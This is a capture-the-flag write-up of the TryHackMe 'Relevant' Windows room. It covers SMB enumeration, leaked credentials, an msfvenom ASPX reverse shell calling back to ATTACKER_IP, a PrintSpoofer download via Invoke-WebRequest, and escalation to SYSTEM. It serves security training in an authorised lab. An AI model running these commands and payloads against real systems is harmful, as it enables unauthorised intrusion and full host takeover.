# NULLSECURE - FROM NULL TO ROOT

🎥 Video Walkthrough: https://youtu.be/VBisu7-C5Ao

---

# Relevant - TryHackMe | Full Writeup

**Difficulty:** Medium
**OS:** Windows Server 2016
**Category:** Windows Exploitation / SMB Misconfiguration

---

## 1. Overview

"Relevant" is a Windows Medium-difficulty room built around a misconfigured SMB share that leaks credentials, a secondary IIS instance used as an alternate code-execution vector, and privilege escalation from a low-privileged IIS AppPool identity to `NT AUTHORITY\SYSTEM` by abusing `SeImpersonatePrivilege`.

**Techniques covered:**
- Service enumeration with RustScan / Nmap
- Anonymous SMB share enumeration
- Credential recovery from a Base64-encoded file
- RDP access validation (and why it fails on this box)
- ASPX reverse shell delivery through a writable SMB share
- Windows privilege identification (`whoami /priv`)
- NTFS permission analysis (`icacls`)
- Privilege escalation via Print Spoofer (Potato-family exploit)

---

## 2. Recon

Initial scan with RustScan piped into Nmap:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV
```

**Open ports:**

| Port | Service | Notes |
|------|---------|-------|
| 80 | HTTP (IIS 10.0) | Default IIS landing page |
| 135 | MSRPC | |
| 139 / 445 | SMB | Message signing disabled |
| 3389 | RDP | Terminal Services |
| 49663 | HTTP (IIS 10.0) | Second IIS instance on a high port |
| 49666 / 49667 | MSRPC | |

Key host info from `smb-os-discovery`:
- Hostname: `RELEVANT`
- OS: Windows Server 2016 Standard Evaluation (build 14393)

The two IIS instances (80 and 49663) plus SMB with signing disabled were the two leads worth chasing first.

---

## 3. Vulnerability Identification

This room has no web directories to fuzz, so the entry point is found through SMB enumeration rather than content discovery.

**Null-session share listing:**
```bash
smbclient -L //<TARGET_IP>/ -N
```
Result: an unusual custom share, `nt4wrksv`, alongside the default admin shares.

**Accessing the share anonymously:**
```bash
smbclient //<TARGET_IP>/nt4wrksv -N
```
Inside: a single file, `passwords.txt`, readable — and, importantly, the share also allows **write** access to the anonymous/guest session. That write access is what later enables webshell delivery.

**passwords.txt contents (Base64-encoded):**
```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decoded:
- `Bob : !P@$$W0rD!123`
- `Bill : Juw4nnaM4n420696969!$$$`

Root cause: account passwords stored on a share that also permits anonymous write — a combined information-disclosure + misconfiguration vulnerability.

---

## 4. Exploitation

### 4.1 RDP attempt — rejected path

Both recovered accounts were tested against RDP on port 3389:

```bash
xfreerdp /compression /cert:ignore +auto-reconnect /v:<TARGET_IP> /u:Bob /p:'!P@$$W0rD!123' +clipboard
xfreerdp /compression /cert:ignore +auto-reconnect /v:<TARGET_IP> /u:Bill /p:'Juw4nnaM4n420696969!$$$' +clipboard
```

**Both failed, for two different reasons:**
- **Bob** → connection reset mid-negotiation (`BIO_read returned a system error 104`). This pattern is typical of an account that is **not a member of the Remote Desktop Users group** — the server drops the session before a desktop session is granted, rather than rejecting the credentials outright.
- **Bill** → `ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED`. The account's password has expired and requires a change at next logon. A standard RDP client can't complete an interactive password-change prompt over this connection, so the session is torn down with a TLS alert instead.

**Conclusion:** RDP is a dead end for both accounts on this box. The writable SMB share is the real way in.

### 4.2 Webshell delivery via SMB → IIS

The `nt4wrksv` share is exposed as a virtual directory under the second IIS instance (port 49663). Any file uploaded there becomes reachable over HTTP.

**Generate the payload:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f aspx -o shell.aspx
```

**Upload it through the writable share:**
```bash
smbclient //<TARGET_IP>/nt4wrksv -N
smb: \> put shell.aspx
```

**Catch the callback, then trigger execution via the browser:**
```bash
nc -lvnp <PORT>
```
Navigate to:
```
http://<TARGET_IP>:49663/nt4wrksv/shell.aspx
```

This returns a reverse shell running as the IIS worker process identity:
```
whoami
iis apppool\defaultapppool
```

---

## 5. Post-Exploitation

Privilege check on the new shell:
```
whoami /priv
```
Result: `SeImpersonatePrivilege` is **Enabled** — the classic signal that a Potato-family exploit (Juicy Potato / Rogue Potato / Print Spoofer) will work, since IIS AppPool identities are commonly granted this privilege by default.

**User flag:**
```
cd C:\Users\Bob\Desktop
type user.txt
THM{REDACTED}
```

---

## 6. Privilege Escalation

With `SeImpersonatePrivilege` confirmed, the next step is getting `PrintSpoofer64.exe` onto the box. A simple Python HTTP server on the attacker machine serves the binary for retrieval via `Invoke-WebRequest`:

```bash
# on the ATTACKER machine
python3 -m http.server 8000
```

### 6.1 Failed attempt — wrong drop location

The first attempt staged `PrintSpoofer64.exe` directly in the shell's current working directory, `C:\Windows\System32\inetsrv`:

```powershell
powershell -Command "Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/PrintSpoofer64.exe -OutFile PrintSpoofer.exe"
```

**Result:** `Access to the path 'C:\Windows\System32\inetsrv\PrintSpoofer.exe' is denied.`

Checking why with `icacls`:
```
icacls "c:\windows\system32\inetsrv"
```
The ACLs show write/full-control reserved for `NT SERVICE\TrustedInstaller`, `NT AUTHORITY\SYSTEM`, and `BUILTIN\Administrators`; `BUILTIN\Users` only gets read/execute. The `iis apppool\defaultapppool` identity isn't a member of any group with write rights there, so the write is denied at the filesystem level — **`SeImpersonatePrivilege` doesn't override NTFS permissions**, it only matters once you already have code execution and need to escalate the token.

**Fix:** stage the binary in a directory the AppPool identity can actually write to. The webroot behind the already-writable `nt4wrksv` share (`C:\inetpub\wwwroot\nt4wrksv`) works, since anonymous write there was already confirmed in step 3.

### 6.2 Successful escalation

```powershell
powershell -Command "Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
PrintSpoofer64.exe -i -c cmd
```

Print Spoofer abuses the Print Spooler service's named pipe together with `SeImpersonatePrivilege` to coerce a SYSTEM authentication, then impersonates that resulting token to spawn a SYSTEM-level `cmd.exe`.

**Root flag:**
```
cd C:\Users\Administrator\Desktop
type root.txt
THM{REDACTED}
```

Reference: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

---

## 7. Conclusion

| Stage | Vulnerability / Technique | Outcome |
|---|---|---|
| Recon | Dual IIS instances + SMB signing disabled | Attack surface mapped |
| Vulnerability ID | Anonymous, writable SMB share (`nt4wrksv`) leaking credentials | Cleartext-equivalent credentials recovered |
| Exploitation (rejected) | RDP login with recovered credentials | Failed — no RDP group membership / expired password |
| Exploitation | ASPX webshell uploaded via writable share, triggered over HTTP | Shell as `iis apppool\defaultapppool` |
| Post-Exploitation | `SeImpersonatePrivilege` confirmed enabled | Potato-style escalation path viable |
| Privesc (rejected) | Payload drop in `System32\inetsrv` | Failed — TrustedInstaller-owned directory, no write ACL for AppPool identity |
| Privilege Escalation | Print Spoofer abusing `SeImpersonatePrivilege` | SYSTEM shell obtained |

---

## 8. Attack Chain Summary

```
RustScan/Nmap recon
        ↓
Anonymous, writable SMB share discovered (nt4wrksv)
        ↓
Leaked Base64 credentials recovered (Bob, Bill)
        ↓
RDP login attempts → both rejected (no RDP rights / expired password)
        ↓
ASPX webshell uploaded via writable SMB share
        ↓
Webshell executed via IIS on port 49663 → shell as iis apppool\defaultapppool
        ↓
SeImpersonatePrivilege identified via whoami /priv
        ↓
Print Spoofer drop in System32\inetsrv → rejected (NTFS ACL denies write)
        ↓
Print Spoofer redeployed in writable webroot → executed
        ↓
SYSTEM shell obtained → root flag captured
```

---

## Disclaimer

This writeup documents a walkthrough of a **TryHackMe** lab environment created strictly for educational purposes. All actions were performed against an isolated, intentionally vulnerable machine with explicit authorization from the platform. Do not use these techniques against systems you do not own or do not have explicit permission to test.

**A1GCH ⚔ NullSecure**
